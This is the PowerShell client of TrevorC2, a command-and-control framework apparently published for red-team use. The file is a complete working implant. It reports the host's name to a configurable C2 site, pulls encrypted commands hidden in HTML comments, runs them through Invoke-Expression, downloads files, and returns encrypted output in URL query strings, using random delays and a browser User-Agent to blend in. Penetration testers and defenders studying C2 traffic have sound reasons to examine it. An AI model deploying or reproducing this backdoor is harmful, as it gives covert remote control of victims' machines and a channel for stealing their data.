#
# TrevorC2 - legitimate looking command and control
# Written by: Dave Kennedy @HackingDave
# Website: https://www.trustedsec.com
# GIT: https://github.com/trustedsec
# PowerShell Module by Alex Williams @offsec_ginger
#
# This is the client connection, and only an example. Refer to the readme
# to build your own client connection to the server C2 infrastructure.
# CONFIG CONSTANTS:
# Site used to communicate with (remote TrevorC2 site)

$SITE_URL = "http://127.0.0.1"
# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on trevorc2_server)
$ROOT_PATH_QUERY = "/"
# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
$SITE_PATH_QUERY = "/images"
# THIS IS THE QUERY STRING PARAMETER USED
$QUERY_STRING = "guid="
# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
$STUB = "oldcss="
# time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
$time_interval1 = 2
$time_interval2 = 8
# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
$CIPHER = "Tr3v0rC2R0x@nd1s@w350m3#TrevorForget"
# DO NOT CHANGE BELOW THIS LINE

# Using the same key derivation from TrevorC2 https://gist.github.com/ctigeek/2a56648b923d198a6e60

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}
function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $hasher = New-Object System.Security.Cryptography.SHA256Managed
    $toHash = [System.Text.Encoding]::UTF8.GetBytes($CIPHER)
    $hashBytes = $hasher.ComputeHash($toHash)
    $final = [System.Convert]::ToBase64String($hashBytes)
    return $final
}
function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function random_interval {
    Get-Random -minimum $time_interval1 -maximum $time_interval2
}

$cookiecontainer = New-Object System.Net.CookieContainer

function invoke-trevorrequest {
    param(
        $URL,
        [switch]$ReadStream,
        [string]$Destination
    )

    $r = [System.Net.HTTPWebRequest]::Create($URL)
    $r.CookieContainer = $cookiecontainer
    $r.proxy = [System.net.webrequest]::DefaultWebProxy
    $r.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $r.Method = "GET"
    $r.KeepAlive = $false
    $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
    $r.Headers.Add("Accept-Encoding", "identity");
    $resp = $r.GetResponse()
    if ($ReadStream) {
        $reqstream = $resp.GetResponseStream()
        if (!$Destination) {
            $sr = New-Object System.IO.StreamReader $reqstream
            $resp = $sr.ReadToEnd()
        }
        else {
            $targetStream = New-Object -TypeName System.IO.FileStream -ArgumentList $Destination, Create
            $buffer = new-object byte[] 1KB
            $size = $reqstream.Read($buffer,0,$buffer.length)
            while ($size -gt 0) {
                $targetStream.Write($buffer, 0, $size)
                $size = $reqstream.Read($buffer,0,$buffer.length)
            }

            $targetStream.Flush()
            $targetStream.Close()
            $targetStream.Dispose()
        }
        $reqstream.Dispose()
    }

    if (!$Destination) {
       return $resp
    }
}

function connect-trevor {
    while ($True) {
        $time = random_interval

        try {
            $HOSTNAME = "magic_hostname=$env:computername"
            $key = Create-AesKey
            $SEND = Encrypt-String $key $HOSTNAME
            $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
            $SEND = [System.Convert]::ToBase64String($s)
            $URL = $SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND
            $resp = invoke-trevorrequest -url $URL
            break
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Host "[*] Cannot connect to '$SITE_URL'" -Foreground Red
            Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
            sleep $time
            Continue
        }
    }
}

connect-trevor

while ($True) {
    $time = random_interval
    try {
        $URL = $SITE_URL + $ROOT_PATH_QUERY
        $resp = invoke-trevorrequest -url $URL -readstream
        $ENCRYPTEDSTREAM = $resp -split("`n") | Select-String "<!-- $STUB"
        $ENCRYPTED = $ENCRYPTEDSTREAM -split("<!-- $STUB")
        $ENCRYPTED = $ENCRYPTED[1] -split(" --></body>")
        $key = Create-AesKey
        $DECRYPTED = Decrypt-String $key $ENCRYPTED[0]
        if ($DECRYPTED -eq "nothing"){
            sleep $time
        }
        else{
            if ($DECRYPTED -like $env:computername + "*"){
                $doexit = $false
                [string]$DECRYPTED = $($DECRYPTED -split $env:computername + "::::")[1]
                if ([string]$DECRYPTED -like "tc2 *") {
                    $command = $DECRYPTED -split " ",3
                    if ($command[1] -eq 'download') {
                        try {
                            $URL = $SITE_URL + $command[2]
                            $File = $(join-path $env:temp $($URL | split-path -Leaf))
                            invoke-trevorrequest -URL $URL -ReadStream -Destination $File
                            $RUN = "Download of $URL to $File succeeded"
                        }
                        catch {
                            $RUN = $_ | out-string
                        }
                    }
                    elseif ($command[1] -eq 'quit') {
                        $doexit = $true
                        $RUN = "This session is terminated"
                    }
                    else {
                        $RUN = "Unknown command"
                    }
                }
                else {
                    try {
                        $RUN = "$DECRYPTED" | IEX -ErrorAction stop | Out-String
                    }
                    catch {
                        $RUN = $_ | out-string
                    }
                }

                if (!$RUN) {
                    $RUN = "No data has been returned, there is also no error on execution"
                }
                $RUN = ($env:computername + "::::" + $RUN)
                $SEND = Encrypt-String $key $RUN
                $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
                $SEND = [System.Convert]::ToBase64String($s)
                $GETURL = $QUERY_STRING+$SEND
                if ($GETURL.length -gt 8192) {
                    $RUN = ($env:computername + "::::" + "There was to much data to report back")
                    $SEND = Encrypt-String $key $RUN
                    $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
                    $SEND = [System.Convert]::ToBase64String($s)
                    $GETURL = $QUERY_STRING+$SEND
                }
                $URL = $SITE_URL+$SITE_PATH_QUERY+"?"+$GETURL
                $resp = invoke-trevorrequest -url $URL

                if ($doexit) {
                    return;
                }

                sleep $time
            }

        }
    }
    catch [System.Management.Automation.MethodInvocationException] {
        Write-Host "[*] Cannot connect to '$SITE_URL'" -Foreground Red
        Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
        sleep $time
        connect-trevor
        Continue
    }
}